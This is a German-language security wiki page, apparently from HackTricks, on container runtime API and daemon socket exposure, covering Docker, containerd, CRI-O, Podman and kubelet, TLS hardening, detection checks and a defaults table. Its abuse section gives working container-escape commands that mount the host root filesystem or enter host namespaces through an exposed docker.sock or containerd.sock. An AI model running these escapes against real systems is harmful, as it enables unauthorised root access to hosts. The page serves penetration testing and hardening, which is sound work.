# Runtime-API und Daemon-Exponierung

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Viele reale Container-Kompro­misses beginnen überhaupt nicht mit einem namespace escape. Sie beginnen mit dem Zugriff auf die runtime control plane. Wenn eine Workload mit `dockerd`, `containerd`, CRI-O, Podman oder `kubelet` über eine eingehängte Unix-Socket-Datei oder einen exponierten TCP-Listener sprechen kann, könnte ein Angreifer in der Lage sein, einen neuen Container mit höheren Rechten anzufordern, das Host-Dateisystem zu mounten, Host-Namespaces zu betreten oder sensible Node-Informationen abzurufen. In solchen Fällen ist die runtime API die eigentliche Sicherheitsgrenze, und deren Kompromittierung ist funktional nah an einer Kompromittierung des Hosts.

Deshalb sollte die Exponierung von runtime-Sockets getrennt von Kernel-Schutzmaßnahmen dokumentiert werden. Ein Container mit gewöhnlichem seccomp, capabilities und MAC confinement kann immer noch einen API-Aufruf davon entfernt sein, den Host zu kompromittieren, wenn ` /var/run/docker.sock` oder `/run/containerd/containerd.sock` darin eingehängt sind. Die Kernel-Isolierung des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Management-Ebene vollständig exponiert bleibt.

## Daemon-Zugriffsmodelle

Docker Engine exponiert traditionell seine privilegierte API über die lokale Unix-Socket unter `unix:///var/run/docker.sock`. Historisch wurde sie auch remote über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen TLS-geschützten Listener auf `2376` angeboten. Das Remote-Exponieren des Daemons ohne starke TLS- und Client-Authentifizierung verwandelt die Docker API effektiv in eine Remote-Root-Schnittstelle.

`containerd`, CRI-O, Podman und `kubelet` bieten ähnliche hochwirksame Angriffsflächen. Die Namen und Workflows unterscheiden sich, aber die Logik nicht. Wenn die Schnittstelle es dem Aufrufer erlaubt, Workloads zu erstellen, Host-Pfade zu mounten, Anmeldeinformationen abzurufen oder laufende Container zu verändern, ist die Schnittstelle ein privilegierter Management-Kanal und sollte entsprechend behandelt werden.

Gängige lokale Pfade, die überprüft werden sollten:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ältere oder stärker spezialisierte Stacks können auch Endpunkte wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` exponieren. Diese sind in modernen Umgebungen seltener, sollten aber bei Auftreten mit derselben Vorsicht behandelt werden, da sie Laufzeit-Kontrolloberflächen und nicht gewöhnliche Anwendungssockets darstellen.

## Sicherer Remote-Zugriff

Wenn ein Daemon über die lokale Socket hinaus exponiert werden muss, sollte die Verbindung mit TLS geschützt und vorzugsweise mit gegenseitiger Authentifizierung versehen werden, sodass der Daemon den Client und der Client den Daemon verifiziert. Die alte Gewohnheit, den Docker daemon aus Bequemlichkeit über plain HTTP zu öffnen, ist einer der gefährlichsten Fehler in der Container-Verwaltung, weil die API-Oberfläche stark genug ist, um direkt privilegierte Container zu erstellen.

Das historische Docker-Konfigurationsmuster sah folgendermaßen aus:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Auf systemd-basierten Hosts kann die daemon-Kommunikation auch als `fd://` erscheinen, was bedeutet, dass der Prozess einen von systemd vorgeöffneten socket erbt, anstatt ihn selbst direkt zu binden. Die wichtige Lehre ist nicht die genaue Syntax, sondern die sicherheitsrelevante Konsequenz. Sobald der daemon über einen eng eingeschränkten lokalen socket hinaus lauscht, werden transport security und client authentication verpflichtend statt optionale Härtungsmaßnahmen.

## Missbrauch

Wenn ein runtime socket vorhanden ist, bestätige, welcher es ist, ob ein kompatibler client existiert und ob raw HTTP- oder gRPC-Zugriff möglich ist:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Diese Befehle sind nützlich, weil sie zwischen einem toten Pfad, einer gemounteten, aber unzugänglichen socket und einer aktiven privilegierten API unterscheiden. Wenn der client erfolgreich ist, stellt sich als Nächstes die Frage, ob die API einen neuen container mit einem host bind mount oder host namespace sharing starten kann.

### Vollständiges Beispiel: Docker Socket To Host Root

Wenn `docker.sock` erreichbar ist, besteht der klassische Escape darin, einen neuen container zu starten, der das Root-Dateisystem des Hosts mountet und dann mit `chroot` hineinwechseln:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dies ermöglicht direkte Ausführung mit root-Rechten auf dem Host über den Docker daemon. Die Auswirkungen beschränken sich nicht auf das Lesen von Dateien. Sobald sich der Angreifer im neuen Container befindet, kann er Host-Dateien verändern, Anmeldeinformationen erbeuten, Persistenz etablieren oder zusätzliche privilegierte Workloads starten.

### Vollständiges Beispiel: Docker Socket zu Host-Namespaces

Wenn der Angreifer den Namespace-Einstieg anstelle eines reinen Dateisystemzugriffs bevorzugt:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Dieser Pfad erreicht den Host, indem er die runtime auffordert, einen neuen container mit expliziter host-namespace-Exposition zu erstellen, statt den aktuellen auszunutzen.

### Vollständiges Beispiel: containerd Socket

Ein gemounteter `containerd` Socket ist normalerweise genauso gefährlich:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Die Auswirkung ist erneut die Kompromittierung des Hosts. Auch wenn Docker-spezifische Tools fehlen, kann eine andere Runtime-API dieselbe administrative Kontrolle bieten.

## Checks

Das Ziel dieser Checks ist zu klären, ob der Container eine Management-Ebene erreichen kann, die außerhalb der Vertrauensgrenze hätte bleiben sollen.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Was hier interessant ist:

- Ein gemounteter runtime socket ist in der Regel ein direktes administratives Primitive und keine bloße Informationsoffenlegung.
- Ein TCP-Listener auf `2375` ohne TLS sollte als Remote-Compromise-Bedingung behandelt werden.
- Environment-Variablen wie `DOCKER_HOST` zeigen oft, dass der Workload bewusst dafür ausgelegt wurde, mit dem Host-runtime zu kommunizieren.

## Standardwerte der Laufzeit

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig lokaler Unix-Socket | `dockerd` hört auf dem lokalen Socket und der Daemon läuft in der Regel als root | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Standardmäßig daemonloses CLI | Für normalen lokalen Gebrauch ist kein lang laufender privilegierter Daemon erforderlich; API-Sockets können jedoch weiterhin exponiert werden, wenn `podman system service` aktiviert ist | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Lokaler privilegierter Socket | Administrative API über den lokalen Socket exponiert und wird üblicherweise von höherstufigen Werkzeugen genutzt | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Lokaler privilegierter Socket | CRI-Endpoint ist für node-lokale vertrauenswürdige Komponenten vorgesehen | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-lokale Verwaltungs-API | Kubelet sollte von Pods nicht breit erreichbar sein; Zugriff kann Pod-Zustand, Credentials und Ausführungsfunktionen offenlegen, abhängig von authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
{{#include ../../../banners/hacktricks-training.md}}
